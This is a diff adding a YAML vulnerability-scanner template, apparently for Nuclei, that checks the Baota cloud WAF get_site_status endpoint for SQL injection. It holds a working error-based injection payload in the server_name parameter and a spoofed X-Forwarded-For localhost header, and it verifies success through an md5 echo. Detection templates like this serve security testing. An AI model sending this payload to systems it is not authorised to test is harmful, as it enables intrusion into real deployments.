@@ -1,0 +1,30 @@
+id: poc-yaml-bt-waf-get-site-status-sqli
+info:
+  name: 堡塔云WAF get_site_status SQL注入问漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template checks for a SQL injection vulnerability in the 堡塔云WAF get_site_status endpoint.
+variables:
+  t1: "{{rand_int(1000,9999)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        GET /get_site_status?server_name='-extractvalue(1,concat(0x5c,md5({{t1}})))-' HTTP/1.1
+        Host: 127.0.0.251
+        X-Forwarded-For: 127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "{{substr(t2,0,31)}}"
